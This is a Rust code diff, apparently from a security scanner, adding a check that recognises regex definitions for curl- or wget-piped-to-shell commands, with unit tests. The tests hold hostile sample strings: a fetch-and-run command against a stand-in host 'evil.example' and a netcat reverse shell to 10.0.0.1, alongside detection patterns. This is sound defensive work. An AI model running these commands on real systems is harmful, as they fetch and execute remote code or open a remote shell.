@@ -552,6 +552,43 @@ pub fn pipe_line_doc_installer(line: &str) -> bool {
     !urls.is_empty() && urls.iter().all(|u| doc_installer_url(u))
 }
 
+fn shell_invoke_pipe_is_escaped(segment: &str) -> bool {
+    let lower = segment.to_ascii_lowercase();
+    let end = lower
+        .rfind("bash")
+        .map(|i| i + 4)
+        .or_else(|| lower.rfind("sh").map(|i| i + 2));
+    let Some(end) = end else {
+        return false;
+    };
+    let before = segment[..end].trim_end();
+    let Some(pipe_idx) = before.rfind('|') else {
+        return false;
+    };
+    pipe_idx > 0 && before.as_bytes()[pipe_idx - 1] == b'\\'
+}
+
+/// True when the line defines a regex for curl/wget piped to sh/bash and every such shell pipe is escaped (`\|`).
+pub fn pipe_line_regex_def(line: &str) -> bool {
+    static PATTERNS: &[&str] = &[
+        r"(?i)curl[^\n]*\|\s*(ba)?sh",
+        r"(?i)wget[^\n]*\|\s*(ba)?sh",
+    ];
+    let mut any = false;
+    for pat in PATTERNS {
+        let Ok(re) = Regex::new(pat) else {
+            continue;
+        };
+        for m in re.find_iter(line) {
+            any = true;
+            if !shell_invoke_pipe_is_escaped(m.as_str()) {
+                return false;
+            }
+        }
+    }
+    any
+}
+
 const MAX_HIDDEN_PAYLOADS: usize = 16;
 const MAX_DECODED_BYTES: usize = 64 * 1024;
 
@@ -1219,6 +1256,26 @@ mod tests {
         ));
         assert!(!pipe_line_trusted("curl | sh"));
         assert!(!pipe_line_trusted("curl http://sh.rustup.rs | sh"));
+    }
+
+    #[test]
+    fn pipe_line_regex_def_escaped_only() {
+        assert!(pipe_line_regex_def(
+            r#"BLOCK = re.compile(r"curl\s+[^|\s]+\| sh")"#
+        ));
+        assert!(pipe_line_regex_def(
+            r#"PATTERN = r"wget\s+[^|\s]+\| bash""#
+        ));
+        assert!(!pipe_line_regex_def("curl https://evil.example/x | sh"));
+        assert!(!pipe_line_regex_def("curl\\s+[^|\\s]+| sh"));
+        assert!(!pipe_line_regex_def(
+            r#"r"curl\s+[^|\s]+\| sh" + " curl https://evil.example/x | sh""#
+        ));
+        assert!(!pipe_line_regex_def("curl | sh"));
+        assert!(!pipe_line_regex_def("echo hello"));
+        assert!(!pipe_line_regex_def(
+            r#"nc -e /bin/sh 10.0.0.1 4444"#
+        ));
     }
 
     #[test]
